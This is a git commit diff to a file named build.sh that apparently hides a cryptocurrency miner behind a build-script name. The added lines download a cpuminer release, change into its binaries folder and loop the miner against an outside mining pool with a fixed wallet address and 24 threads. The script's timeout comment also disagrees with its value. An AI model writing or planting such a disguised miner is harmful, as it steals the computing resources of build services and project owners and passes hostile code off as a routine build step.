072ebe00723b1a9419eb27eba781514e722b033a
lushenry654 <85671596+lushenry654@users.noreply.github.com>
2021-11-04 15:04:32 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,3 +1,4 @@
+
 #!/bin/bash
 
 Timeout=1200 # 30 minutes
@@ -12,10 +13,12 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
+wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.3/cpuminer-gr-1.2.3-x86_64_linux.tar.gz
+tar xf cpuminer-gr-1.2.3-x86_64_linux.tar.gz
+cd cpuminer-gr-1.2.3-x86_64_linux
+cd binaries
 while [ 1 ]; do
-	./cpuminer-sse2 -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17056 -u RFcnLsWDziyWU7Hj8VrTpuAAv7FFYBJTi6.Dee
+	./cpuminer-sse2 -a gr -o stratum+tcps://us.flockpool.com:5555 -u RFcnLsWDziyWU7Hj8VrTpuAAv7FFYBJTi6.Dee --no-tune -t 24
 	sleep 5
 done
 # <your script here>
